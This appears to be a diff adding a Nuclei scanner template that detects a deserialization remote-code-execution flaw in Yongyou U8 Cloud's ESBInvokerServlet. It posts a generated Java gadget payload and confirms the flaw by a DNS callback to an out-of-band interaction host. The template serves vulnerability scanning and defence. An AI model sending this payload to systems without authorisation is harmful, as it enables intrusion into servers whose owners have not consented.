@@ -1,0 +1,30 @@
+id: yongyou-esbinvokerservlet-deserialization-rce
+info:
+  name: Yongyou U8 Cloud ESBInvokerServlet Deserialization RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog, deserialization, rce
+
+variables:
+  reverse: "{{interactsh-url}}"
+  malicious_payload: '{{generate_java_gadget("dns", reverse, "raw")}}'
+
+http:
+  - raw:
+      - |
+        POST /servlet/ESBInvokerServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-java-serialized-object
+
+        {{malicious_payload}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "{{reverse}}"
